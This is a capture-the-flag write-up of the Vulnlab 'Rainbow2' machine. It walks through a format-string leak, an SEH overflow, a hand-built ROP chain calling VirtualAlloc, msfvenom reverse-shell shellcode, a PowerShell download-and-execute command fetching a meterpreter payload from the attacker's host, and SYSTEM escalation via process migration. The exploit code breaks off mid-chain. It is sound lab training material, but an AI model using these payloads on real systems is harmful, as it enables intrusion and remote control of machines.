# Rainbow2

Hola Mundo!

After passing OSEP and getting my OSC3 (yay!) I wanted to do something other than study and since I finally have time, I decided to try something I got in my TODO list for quite long: [Vulnlab](https://www.vulnlab.com/) a penetretation testing & red teaming labs run by [xct](https://twitter.com/xct_de), one of my favorites pwners to follow. (I highly recommend his content, specially the red-team labs playlists on youtube) 

A cool thing about __Vulnlab__ is that once subscribed, you can manage all the labs from discord, which is really awesome. Also, you can search trough the machines and chains (more than one machine in an AD enviroment) to check what is the intended exploitation path, so that way, you can search for what you want to practice. Since it was months without doing some _pwning_ I started with the __rainbow__ machine an easy to medium binary exploitation machine that I really enjoyed, so after completing it,  I decided to try __rainbow2__. 

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-20-55-24.png)

The machine is rated __Hard__ with good reason so this write-up will be more like a guide or a "manual" on how to exploit the machine, since I will assume some knowledge in binary exploitation, otherwhise it will be too long to read (and write). If you are not familiar with regular buffer overflows, I will recommmend you to try the __rainbow__ machine first, read and try some __ROP__ exercises [here](https://fuzzysecurity.com/tutorials/expDev/7.html), and then comeback to this one. As always this is just a recommendation, since learning is different for everyone ^^. I will also take the chance to recommend this machine to everyone that is studying for the __OSED__ certification, it will help you prepare for it.

some of the tools or frameworks I will be using during this post are th following: (they are not mandatory, you can use any alternatives you prefer)

- [nmap](https://nmap.org/)
- [IDA](https://hex-rays.com/ida-pro/)
- [windbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)
- [pwntools](https://github.com/Gallopsled/pwntools)
- [msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)
- [metasploit](https://www.metasploit.com/)

After all the talk above, and  once we got the machine running (again, from discord, really cool stuff), we can grab thw IP address and run an nmap, as shown below.

```
# Nmap 7.94 scan initiated Sat Jun 24 01:17:24 2023 as: nmap -Pn -sV -sC -oN portscan.txt 10.10.88.129
Nmap scan report for 10.10.88.129
Host is up (0.24s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-05-22  11:57AM               705536 filesrv.exe
| 06-05-22  02:43PM                  275 README.txt
|_06-09-22  05:36AM       <DIR>          SysWOW64
| ftp-syst: 
|_  SYST: Windows_NT
2121/tcp open  msdtc         Microsoft Distributed Transaction Coordinator (error)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-24T05:18:32+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RAINBOW2
|   NetBIOS_Domain_Name: RAINBOW2
|   NetBIOS_Computer_Name: RAINBOW2
|   DNS_Domain_Name: Rainbow2
|   DNS_Computer_Name: Rainbow2
|   Product_Version: 10.0.20348
|_  System_Time: 2023-06-24T05:18:28+00:00
| ssl-cert: Subject: commonName=Rainbow2
| Not valid before: 2023-06-23T05:15:02
|_Not valid after:  2023-12-23T05:15:02
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Ee can tell from the above, This is a Windows machine, and there's an FTP service that allows anonymous login. We can log-in, inspect, and download the files in it. there's a _README.txt_ that contains the following:

```
# FileSrv v0.2

Our simple file sharing server! Currently under development - we still seem to have some minor problems with binary files.

Changelog:
 - After our last custom server got hacked we made sure to enable all mitigations: ASLR, DEP, GS! Now it's 100% secure.
 ```

So, now, we know we are dealing with a file server that probably has all protections enabled. We can confirm this is the service running at port 2121 by doing a test, like connect to it using _netcat_ or something similar. We'll then spin up a Windows VM and start the exploiting, pwn, pwn, pwn. 

After checking that it is the same service running, we'll need to start creating an exploit plan.

We suspect that it will have all protections enabled, so we'll need to leak memory from the binary. Also when debugging or inspecting with something like the _file_ command we'll be able to confirm the binary is 32-bit.

```
➜ file filesrv.exe
filesrv.exe: PE32 executable (console) Intel 80386, for MS Windows, 5 sections
➜ 
```

Ok, so what to do now? I usually try to start with a Static Analysis, but this is written in C++, and finding a function within a socket can be trickier (because of c++ objects, if you want to do it, and don't know how to, you can try starting [from here](https://www.youtube.com/watch?v=o-FFGIloxvE)). One quick thing we can do, if we are able to interact with the binary, is to take note of which output is being sent to stdout, like the string "__ERROR__" that is sent when you enter a wrong command, as we can observe.

```
➜ nc 10.10.73.242 2121
USER
ERROR
AAA
ERROR
```

We can search for the __ERROR__ string above in IDA, but since we are dealing with [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), first we need to rebase the address of the executable to 0x0 so it shows the Offset and not the preferred address, I do this as a good practice, but this is not a necessary step. (File > Segments > Rebase Program)

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-15-33-41.png)

Next, open the _strings_ window in IDA (Shift + f12) and search for the __ERROR__ string. We'll find it in the [.rdata](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#:~:text=IMAGE_SCN_CNT_INITIALIZED_DATA%20%7C%20IMAGE_SCN_MEM_READ-,.rdata,-Read%2Donly%20initialized) section at offset 0x000904C4 as shown below.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-15-35-08.png)

If we double-click on it. We'll see it on the _.rdata_ section, and also, we'll be able to perform a cross-reference to see where it's being called, in this case, just one function.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-15-40-27.png)

From experience and looking at the above funcion in the graph view, we'll observe there's a flow control at the bottom of the function.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-15-41-43.png)

This usually indicates there are different "paths" the flow can take. Exploring the disassembly can help us to identify and try different commands since We needed to leak an address, as my regular routine with pwn challenges, if I cannot quickly perform Reverse engineering (like in this case, since the binary is in C++, this will probably taker some time), I will just try to look for something like a [format string](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) bug, so after enumerating different commands I realize the _LST_ is vulnerable to format string, we can corroborate this by sending the command __LST %p-%p-%p__, and we'll observe hexadecimal values returned.

```
➜ nc 10.10.73.242 2121
LST %p-%p-%p
ERROR: Can not open Path: 73AA1B6E-3FEA4120-3FEA4120

```

The values above correspond to Addresses, and corroborating on the debugger, the second one is an address of the binary. We can use it to calculate the base address of the binary and defeat ASLR. At this point, we can use the following code to start interacting with the binary.


```python
#!/usr/bin/python3
from pwn import *

target = '10.10.72.141'
r = remote(target, 2121)

payload = b"LST %p-%p-%p-%p-%p"
r.sendline(payload)


r.recvuntil(b"ERROR: Can not open Path: ")
leaks = r.recvline().strip().split(b"-")
log.info(f"leaking {leaks}")
for i in range(len(leaks)):
    leaks[i] = int(leaks[i].decode(), 16)
log.info(f"binary leak = {hex(leaks[2])}")

filesrv = leaks[2] - 0x14120

log.info(f"base address = {hex(filesrv)}")
```

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-16-18-43.png)

Ok, so now we need to find a vulnerability, probably a Buffer Overflow. After trying again enumerating the commands, we'll found out that the "LST" command is also vulnerable to a buffer overflow. We can test it by sending the following payload after the memory leaks.

```python

payload = b"A"* 0xfb0

```
Let's observe the crash using the _exchain_ command in widbg or a similar one in the debugger of your choosing.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-16-30-46.png)

At this point we can overflow the _SEH_ when we send a payload of size 0xfb0. The number 0xfb0 is something to keep in consideration since this size helps me to keep the exploit stable. We'll see later that when exploiting remote, the return address Offset to overwrite may vary, so I recommend this size, but you can overflow with more if you need to.

Next, we need to calculate the Offset of when the SEH value is being overwritten so we can exploit it. I used __msf-pattern__, from Kali and determined the proper Offset to overwrite the SEH at 0x408 bytes. We can confirm that sending the following payload.

```python
payload = b"LST "
payload += b"A"*0x408
payload += b"BBBB"
payload += b"C"*(0xfb0-len(payload))
r.sendline(payload)
```

After that, we can confirm the crash again using the __!exchain__ command in windbg.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-16-47-00.png)

When the above is verified, we can check for bad characters. This way, we can avoid the use of them when sending our ROP-chain, the characters found were: 0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20.

So, what now? We need to defeat the next protection in our way [DEP](https://support.microsoft.com/en-us/topic/what-is-data-execution-prevention-dep-60dabc2b-90db-45fc-9b18-512419135817). We can use the good old __ROP__ for that. We can probably create a rop chain using something like __ropper__ or __mona__, but in many cases, I just create the chain myself. I just like to do things hard for me [uwu](https://dplastico.github.io/2023/03/23/doing-it-wrong-Apocalypse_2023_ctf.html)

Ok, we should collect gadgets at this point to start _ropping_, I used __ropper__, which runs on Kali, what I was using at the moment, and since we need an offset to the base address, it is important to pass the parameter __-I 0x0__ to ropper, this way the addresses will not contain the preferred base address as the base address, and we will have just the offsets.

After collecting gadgets, let's start creating our rop-chain.


Ok, but wait... This is a SEH overflow, so we cannot just go into "Mordor" and start ropping.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-21-36-57.png)

If we do the regular exploit plan for SEH, which is to find a "POP POP RET" gadget, we will jump and execute the NSEH, but this is pointless since we steal have not defeated __DEP__ and we will still need to execute something, this is a "stack pivot" gadget will help us. We just need to find a gadget that allows us to move the stack pointer to another area we control in our payload.

After some exploration, at Offset 0x00011396, we'll find an "add  esp, 0xe10" I ended up using. We can create a payload to accomplish what's being discussed, like the one below.

```python
buf = b""
buf += b"XXXX"
buf += b"A"*0x68 #offset to pivot landing
buf += rop #from here, there's around 350 bytes to ROP


payload  = b""
payload += b"LST "
payload += buf
payload += b"A" * (0x408-len(buf))
payload += b"BBBB" #We have DEP, so no need to jump to NSEH
payload += p32(filesrv+0x00011396) # Stack pivot add esp, 0xe10
payload += b"\x90" * 64
#payload += shellcode
payload += b"\x90" * (0xfb0-len(payload))

r.sendline(payload)
```

Great, so now it's time to start _ropping_? Well... let's wait a little bit...

![](https://i.kym-cdn.com/entries/icons/facebook/000/016/042/Wait-For-It.jpg)

We need to figure out what rop chain we should create first and to do that, we can inspect the IAT in search for some imported Win32 API that allows us to manipulate memory in a way we can disable _DEP_, since this protection is enabled, we cannot execute Shellcode on the stack so we need a way to bypass this. The common APIs used __WriteProcessMemory__, __VirtualAlloc__, and __VirtualProtect__  are not listed on the IAT. We can verify that by looking at imports sections in IDA. (you can also use windbg for this, it really doesn't matter)

Now If we remember, we also download from the FTP server a _kernel32.dll_ file, probably the one being used by the binary. It that's the case, it means that even if the API is not imported by the binary, we can calculate the Offset from another imported address f to any other API address we want form kernel32. So let's go ahead and do that.

For this binary, I choose to use __VirtualAlloc__, but any of the other mentioned APIs used in __ROP__ techniques should work. We need to choose an address to calculate the Offset from it, and that it is imported, so I choose __TLSfree__ located at offset 0x90148 of the base address in the _idata_ or [IAT (import address table)](https://resources.infosecinstitute.com/topic/the-import-directory-part-1/)

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-17-07-36.png)

We can create a variable for later use with this address.

```python
tlsfree_iat = filesrv+0x00090148
```

Now we need to calculate the Offset of that address to __VirtualAlloc__ within _kernel32.dll_, so we can load the downloaded _kernel32.dll_ in IDA and check the __exports__, but first, we should rebase the program with the base address 0x0 to show us just the Offset to the base address. After that, we can observe the Offset to __TLSFree__: 0x192e0.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-17-18-18.png)

Continuing, we can observe the Offset from the base address to __VirtualAlloc__ in this case: 0x16250.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-17-18-49.png)

With some super-duper-math we can calculate the Offset within the addresses of the functions.

```python
>>> hex(0x192e0 - 0x16250)
>>> '0x3090'
```

Great! We have the information that we need to get the __VirtualAlloc__ address. Let's start _ropping_ ...

![](https://cdn.tosavealife.com/wp-content/uploads/2018/05/Waiting-Memes-52918.jpg)

Not yet... We need to look at how __VirtualAlloc__ [is defined in MSDN](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) so that way we know which parameter we should pass to the function.

Since, we are dealing with x86, where we need to pass the parameter in the stack after the function address and the return address for the function after finishing the exection. We'll create a stub in the stack that looks like the following.

```
- VirtualAlloc Address => The  Address of VirtualAlloc in kernel32.dll 
- Return address => Where we return after VirtualAlloc is executed. This should be where our Shellcode will be  on the stack
- lpAddress => This is the area of memory (downgraded to memory page address, 0x100), so this could be the Shellcode address on the stack also.
- dwSize => 0x1 (in pages)
- flAllocationType =>  0x1000 (the type of allocation)
- flProtect => 0x40, Which corresponds to RWX permissions for the region we are "allocating."
```
The above parameters should be set on the stack in the same order so this table can help us during exploitation.

Finally! We have a plan, let's start _ropping_!

![](https://gifdb.com/images/high/yay-gojo-satoru-jujutsu-kaisen-anime-meme-uv89d004fkc3imhv.gif)

Remember I mentioned the crash was not stable? (at least for me),  depending on the number of bytes or characters I was sending, the address to overwrite changed. That's why at the beginning of the exploit, I placed a _ROP-NOP_ or _ret-slide_ that is just a series of addresses containing a __ret__ instruction. Since we are performing the rop in the stack, the _ret_ instruction acts as a _NOP_, and it will just return to the next instruction. This way, we can solve the issue of the binary crashing at different offsets.

```python
rop = b""
rop += p32(filesrv+0x0007c5f6) * 4 #ret slide
```
One of the first things that are good to do when starting a rop-chain is to save the current stack value, we'll need to do this since we are going to build the chain in the stack, and then it is also needed to direct execution to our Shellcode, so let's begin with that.

The gadget I found to perform this is the following.

```
push esp; add dword ptr [eax], eax; pop ecx; ret;
```

If we noticed, this gadget pushes the _ESP_ value and then "pop it" into _ECX_, but before it adds to the address _EAX_ is pointing to the value of it. So if _EAX_ is not pointing to a writeable area, this will fail. To solve this, we can make the value in _EAX_ point into a writeable area like the .rdata. With that, we can add the following to our chain.

```python
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(filesrv+0xA6030) # address in .data
rop += p32(filesrv+0x000683da) #push esp; add dword ptr [eax], eax; pop ecx; ret;
```
With the above, the stack pointer is now stored in _ECX_. We should probably build our stack in another area to not overwrite the gadgets being sent, so the stub can be constructed above our current payload, I choose 0x50 above, but this value is arbitrary. Let's accomplish this by using the following gadgets.

```python
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xffffffb0) # - 0x50
rop += p32(filesrv+0x0001bb91) # add ecx, edx; clc; pop ebp; ret;)
rop += p32(0x41424344) #junk for ebp
```

We'll use an addition, but we'll "pop" a negative value. This is done to avoid NULL bytes. _ECX_ now has the value of the stack-0x50, and we'll use it to point to our stub

Next, We need to move the value of __TLSFree__ to a register. Since we have the IAT address stored in *tlsfree_iat*, we can dereference it and then subtract the Offset from __VirtualAlloc__


```python
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(tlsfree_iat)
rop += p32(filesrv+0x0002bb94) # mov eax, dword ptr [eax]; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xffffcf70) # 0x3090 
rop += p32(filesrv+0x0003697f) # add eax, edx; ret;
```

We subtracted the value 0x3090, and now _EAX_ has the value of VirtualAlloc in Kernel32. We can then store it in our stub using the following gadget.

```python
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
```

Great, now we should increase the "stub-pointer" in _ECX_ with the following:

```python
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
```

So far, so good. Our next task is to set up the return address where our payload should return after the execution of __VirtualAlloc__, ideally, where our Shellcode resides. One of the reasons to choose to put our stub above the current payload we are sending is so we can calculate where to land, for that after looking at the stack in the debugger at Offset 0x3f0 from our "stub-pointer" looks good, we can use that value, add 0x3f0 and then place it in our stub, ropping like this:

```python
rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xfffffc10) #0x3f0
rop += p32(filesrv+0x00059a05) # sub eax, edx; pop ebp; ret;)
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
```

Great, we add the value first, passing the value of _ECX_ to _EAX_ and then doing a negative subtraction, again to avoid NULL bytes. We should increase the stub-pointer after.

```python
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
```

Now it's time to set up the _lpAddress_ parameter of VirtualAlloc, and since this should be the same value we calculated before, we can just do the same this time. We will subtract 0x3f0-4 to compensate for this (since we increased the stub-pointer by 4).

```python
rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xfffffc14) #0x3f0-4
rop += p32(filesrv+0x00059a05) # sub eax, edx; pop ebp; ret;)
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
```

Awesome, now we are ready to increase the stub-pointer again and move to the next argument.

```python
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
```

We need to set _dwsize_ to 1, since we want to avoid NULL bytes, we can pop -1 to a register and then use a gadget to negate it, and then move it to the stub, as shown below.

```python
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(0xffffffff) #-1
rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
```
Time to increase the stub-pointer...

```python
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
```
Continuing, let's set up now the _flAllocationType_ argument to 0x1000. Nothing fancy here. Just the same we are doing  negating the value and then increasing it. (to avoid NULL and/or badchars)

```python
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(0xffffefff) #-0x1001
rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x000774c6) # dec eax; ret
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
```

Let's move forward in our stub-pointer! We are close...

![](https://i.kym-cdn.com/entries/icons/original/000/009/976/First_World_Problems.jpg)


```python
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
```

The argument left to set in the stub is _flProtect_, which needs to be 0x40 in order to set the permissions of the memory we are allocating as _RWX_, and this way bypasses the _DEP_ protection. Let's use one more time the _negate_ trick to accomplish this.

```python
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(0xffffffc0) #-0x40
rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
rop += p32(0x41424344) #junk for EBP
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
```

Now, the only thing left to add to our chain is a jump to our Shellcode. The way I did this was by calculating the difference between the current stub-pointer in the stack and the Shellcode. Which was 0x14, so we can move the stub-pointer to _EAX_ and then add 0x14 by doing a negative subtraction with _EDX_ . Finally, we can use the "xchg esp, eax; ret;"  gadget to set the value of the stack to it, so after the return, we should land in our payload.


```python
rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xffffffec) # - 0x14
rop += p32(filesrv+0x0003697f) # add eax, edx; ret;
rop += p32(filesrv+0x00066ab3) # xchg esp, eax; ret;
```

We can test the above by creating a variable, _Shellcode_ with the int3 char, that should stop execution, acting as a break-point, if _DEP_ is disabled.

```python
shellcode = b"\xcc"*300
```
And then, adding it to our payload to be sent, as shown below.

```python
payload  = b""
payload += b"LST "
payload += buf
payload += b"A" * (0x408-len(buf))
payload += b"BBBB" #
payload += p32(filesrv+0x00011396) # Stack pivot add esp, 0xe10
payload += b"\x90" * 64
payload += shellcode
payload += b"\x90" * (0xfb0-len(payload))
r.sendline(payload)

r.close()
```

We can corroborate our rop-chain is working using the debugger. We should stop before the _CC_ (breakpoint) instruction is executed.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-08-35.png)

Yay! Now we can execute on the stack (we can confirm by executing on the debugger). We also can control the execution to point to our desired Shellcode, so we can send a reverse shell. At the time, I used the following __msfvenom__ command to generate it.

```
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b"\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
```

Let's replace our shellcode variable with the one generated with _msfvenom_. You can verify that it is working in your local VM  before sending the payload if you need to. The only thing and this is maybe due to latency, but  I had to put a _sleep()_ call before sending the payload to avoid some weird crashes, as shown below.

```python
payload  = b""
payload += b"LST "
payload += buf
payload += b"A" * (0x408-len(buf))
payload += b"BBBB" #
payload += p32(filesrv+0x00011396) # Stack pivot add esp, 0xe10
payload += b"\x90" * 64
payload += shellcode
payload += b"\x90" * (0xfb0-len(payload))
r.sendline(payload)
sleep(2)
r.close()
```

Now let's fire-up the exploit and....


![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-28-28.png)

We got a shell (YAY!) as the user dev.


```
C:\shared>whoami
whoami
rainbow2\dev

C:\shared>
```

![](https://media.tenor.com/HMsPIS-VAxAAAAAC/gandalf-lotr.gif)

After going for the user flag (LOL) we can escalate privileges to get an SYSTEN shell. For that, we check our privileges and groups using the __whoami /all__ comman. We'll receive an output similar to the one below.

```
C:\shared>whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID
============ ============================================
rainbow2\dev S-1-5-21-808228402-3739535260-876242396-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                      
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                 


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ERROR: Unable to get user claims information.

C:\shared>
```
We can observe we have a high-integrity shell, and we are part of NT AUTHORITY. So after all that ropping, I went the easy way and first called a PowerShell reverse_shell and generate a 32-bit meterpreter shell  (remember, we are running on an x86 process).

Next, let's host the reverse shell in a Python web server. and execute PowerShell to download and execute the meterpreter reverse shell with the followign command.

```
(new-object system.net.webclient).DownloadString('http://10.8.0.138/dplashell.txt') | IEX
```
We got a meterpreter session. 

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-40-40.png)

Elevating privileges is now trivial. Migrating to a SYSTEM process, like the _spoolsv_ process, and use the __migrate__ command in Metasploit we'll be enough to accomplish this.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-44-42.png)

We are now SYSTEM!! And after some root-dance we can read the root.txt.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-02-19-47-29.png)

# Conclusion

I really enjoyed the machine, and since I love exploit-dev this was absolute heaven for me. I recommend this machine to anyone interested in learning Windows exploit development or anyone who wants to have some good quality pwning-time. Thanks to __xct__ for the challenge. I'm waiting for rainbow3!

# Full Exploit code

This is the full exploit to get the user.

```python
#!/usr/bin/python3
from pwn import *

target = '10.10.73.242'

r = remote(target, 2121)

#offset = 0x408
#size = 0xfb0

payload = b"LST %p-%p-%p-%p-%p"
r.sendline(payload)


r.recvuntil(b"ERROR: Can not open Path: ")
leaks = r.recvline().strip().split(b"-")
log.info(f"leaking {leaks}")
for i in range(len(leaks)):
    leaks[i] = int(leaks[i].decode(), 16)
log.info(f"binary leak = {hex(leaks[2])}")

filesrv = leaks[2] - 0x14120

log.info(f"base address = {hex(filesrv)}")

### shellcode
#msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbf\xa8\xf9\xb1\xa8\xd9\xe1\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x52\x31\x7a\x12\x83\xea\xfc"
shellcode += b"\x03\xd2\xf7\x53\x5d\xde\xe0\x16\x9e\x1e\xf1"
shellcode += b"\x76\x16\xfb\xc0\xb6\x4c\x88\x73\x07\x06\xdc"
shellcode += b"\x7f\xec\x4a\xf4\xf4\x80\x42\xfb\xbd\x2f\xb5"
shellcode += b"\x32\x3d\x03\x85\x55\xbd\x5e\xda\xb5\xfc\x90"
shellcode += b"\x2f\xb4\x39\xcc\xc2\xe4\x92\x9a\x71\x18\x96"
shellcode += b"\xd7\x49\x93\xe4\xf6\xc9\x40\xbc\xf9\xf8\xd7"
shellcode += b"\xb6\xa3\xda\xd6\x1b\xd8\x52\xc0\x78\xe5\x2d"
shellcode += b"\x7b\x4a\x91\xaf\xad\x82\x5a\x03\x90\x2a\xa9"
shellcode += b"\x5d\xd5\x8d\x52\x28\x2f\xee\xef\x2b\xf4\x8c"
shellcode += b"\x2b\xb9\xee\x37\xbf\x19\xca\xc6\x6c\xff\x99"
shellcode += b"\xc5\xd9\x8b\xc5\xc9\xdc\x58\x7e\xf5\x55\x5f"
shellcode += b"\x50\x7f\x2d\x44\x74\xdb\xf5\xe5\x2d\x81\x58"
shellcode += b"\x19\x2d\x6a\x04\xbf\x26\x87\x51\xb2\x65\xc0"
shellcode += b"\x96\xff\x95\x10\xb1\x88\xe6\x22\x1e\x23\x60"
shellcode += b"\x0f\xd7\xed\x77\x70\xc2\x4a\xe7\x8f\xed\xaa"
shellcode += b"\x2e\x54\xb9\xfa\x58\x7d\xc2\x90\x98\x82\x17"
shellcode += b"\x36\xc8\x2c\xc8\xf7\xb8\x8c\xb8\x9f\xd2\x02"
shellcode += b"\xe6\x80\xdd\xc8\x8f\x2b\x24\x9b\xa5\xa3\x26"
shellcode += b"\xd1\xd2\xb1\x26\xe0\x1b\x3f\xc0\x80\x4b\x69"
shellcode += b"\x5b\x3d\xf5\x30\x17\xdc\xfa\xee\x52\xde\x71"
shellcode += b"\x1d\xa3\x91\x71\x68\xb7\x46\x72\x27\xe5\xc1"
shellcode += b"\x8d\x9d\x81\x8e\x1c\x7a\x51\xd8\x3c\xd5\x06"
shellcode += b"\x8d\xf3\x2c\xc2\x23\xad\x86\xf0\xb9\x2b\xe0"
shellcode += b"\xb0\x65\x88\xef\x39\xeb\xb4\xcb\x29\x35\x34"
shellcode += b"\x50\x1d\xe9\x63\x0e\xcb\x4f\xda\xe0\xa5\x19"
shellcode += b"\xb1\xaa\x21\xdf\xf9\x6c\x37\xe0\xd7\x1a\xd7"
shellcode += b"\x51\x8e\x5a\xe8\x5e\x46\x6b\x91\x82\xf6\x94"
shellcode += b"\x48\x07\x06\xdf\xd0\x2e\x8f\x86\x81\x72\xd2"
shellcode += b"\x38\x7c\xb0\xeb\xba\x74\x49\x08\xa2\xfd\x4c"
shellcode += b"\x54\x64\xee\x3c\xc5\x01\x10\x92\xe6\x03"


#badchars
#0x09 0x0a 0x0d 0x0b 0x0c 0x020

log.info(f"Pivot Gadget : add esp, 0xd60 = {hex(filesrv+0x0001139d)}")


#### Ropping ######
### VirtualAlloc? ###
#modifying because of bad byte at 09
tlsfree_iat = filesrv+0x00090148


rop = b""
rop += p32(filesrv+0x0007c5f6) * 4 #ret slide
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(filesrv+0xA6030) # address in .data
rop += p32(filesrv+0x000683da) #push esp; add dword ptr [eax], eax; pop ecx; ret;
#stack ptr in ECX
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xffffffb0) # - 0x50
rop += p32(filesrv+0x0001bb91) # add ecx, edx; clc; pop ebp; ret;)
rop += p32(0x41424344) #junk for ebp
#Moving the virtual alloc  address to stack
rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
rop += p32(tlsfree_iat)
rop += p32(filesrv+0x0002bb94) # mov eax, dword ptr [eax]; ret;
rop += p32(filesrv+0x000636cd) # pop edx; ret;
rop += p32(0xffffcf70) # 0x3090 # - 4BB0
rop += p32(filesrv+0x0003697f) # add eax, edx; ret;

#eax should point to VirtualAlloc now
rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
#moving virtual alloc to the stack above

#increasing the stack pointer in ecx
